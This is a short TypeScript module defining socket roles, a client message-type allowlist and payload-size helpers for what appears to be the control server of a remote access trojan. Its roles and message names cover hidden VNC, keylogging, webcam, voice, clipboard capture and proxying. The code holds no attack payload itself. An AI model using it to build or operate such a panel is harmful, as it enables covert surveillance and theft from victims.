export type SocketRole = "client" | "viewer" | "console_viewer" | "rd_viewer" | "webcam_viewer" | "hvnc_viewer" | "file_browser_viewer" | "process_viewer" | "keylogger_viewer" | "voice_viewer" | "notifications_viewer";

const textEncoder = new TextEncoder();

export const ALLOWED_CLIENT_MESSAGE_TYPES = new Set([
  "hello",
  "ping",
  "pong",
  "frame",
  "status",
  "console_output",
  "file_list_result",
  "file_download",
  "file_upload_result",
  "file_read_result",
  "file_search_result",
  "command_result",
  "screenshot_result",
  "command_progress",
  "process_list_result",
  "script_result",
  "plugin_event",
  "notification",
  "keylog_file_list",
  "keylog_file_content",
  "keylog_clear_result",
  "keylog_delete_result",
  "voice_uplink",
  "webcam_devices",
  "hvnc_clone_progress",
  "hvnc_lookup_result",
  "clipboard_content",
  "proxy_data",
  "proxy_close",
  "disconnect_info",
]);

export function isAllowedClientMessageType(type: string): boolean {
  return ALLOWED_CLIENT_MESSAGE_TYPES.has(type);
}

export function getMessageByteLength(
  message: string | ArrayBuffer | Uint8Array,
): number {
  if (typeof message === "string") {
    return textEncoder.encode(message).length;
  }
  if (message instanceof ArrayBuffer) {
    return message.byteLength;
  }
  return message.byteLength;
}

export function getMaxPayloadLimit(
  role: SocketRole | undefined,
  clientLimit: number,
  viewerLimit: number,
): number {
  return role === "client" ? clientLimit : viewerLimit;
}
